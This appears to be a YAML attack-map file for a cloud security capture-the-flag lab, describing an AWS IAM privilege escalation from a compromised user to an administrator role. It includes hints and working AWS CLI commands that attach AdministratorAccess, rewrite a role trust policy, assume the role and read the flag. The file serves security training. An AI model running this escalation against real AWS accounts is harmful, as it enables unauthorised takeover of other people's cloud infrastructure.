attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-iam-019-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:AttachRolePolicy and iam:UpdateAssumeRolePolicy permissions
        scoped to the target role, enabling a two-step privilege escalation: first attach
        AdministratorAccess to the target role, then update its trust policy to allow this
        user to assume it.

    - id: target-role
      label: "Target Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-iam-019-to-admin-target-role"
      description: >
        This IAM role starts with minimal permissions and a trust policy that does not
        allow the starting user to assume it. After attaching AdministratorAccess and
        updating the trust policy to name the starting user as a trusted principal, it
        becomes a fully privileged, assumable admin role. By assuming it, you gain full
        administrative control over the AWS account.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/iam-019-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin session gained from assuming the target role.

  edges:
    - from: starting-principal
      to: target-role
      label: "iam:AttachRolePolicy + iam:UpdateAssumeRolePolicy + sts:AssumeRole"
      description: >
        Attach the AWS-managed AdministratorAccess policy to the target role to elevate
        its permissions, then modify the role's trust policy to add the starting user as
        a trusted principal. With both changes in place, assume the now-privileged role
        to obtain temporary credentials with full administrative access.
      hints:
        - "Attach AdministratorAccess to the target role with iam:AttachRolePolicy, then modify the trust policy with iam:UpdateAssumeRolePolicy to allow your principal to assume it, then call sts:AssumeRole."
        - "Wait 15 seconds after both policy writes before calling sts:AssumeRole -- IAM changes need time to propagate."
        - "Browse to https://pathfinding.cloud/paths/iam-019 for full technique details."
      commands:
        - description: "Attach AdministratorAccess to the target role"
          command: "aws iam attach-role-policy --role-name pl-prod-iam-019-to-admin-target-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
        - description: "Update the role trust policy to trust the starting user"
          command: "aws iam update-assume-role-policy --role-name pl-prod-iam-019-to-admin-target-role --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::{account_id}:user/pl-prod-iam-019-to-admin-starting-user\"},\"Action\":\"sts:AssumeRole\"}]}'"
        - description: "Assume the escalated target role"
          command: "aws sts assume-role --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-019-to-admin-target-role --role-session-name escalation-session"
        - description: "Verify admin access with the new session"
          command: "aws iam list-users --max-items 1"

    - from: target-role
      to: ctf-flag
      label: "ssm:GetParameter"
      description: >
        With administrator-equivalent access gained by assuming the target role,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess
        grants ssm:GetParameter on all parameters in the account, so no additional
        permissions are needed beyond the admin session you just obtained.
      hints:
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/iam-019-to-admin --query 'Parameter.Value' --output text"
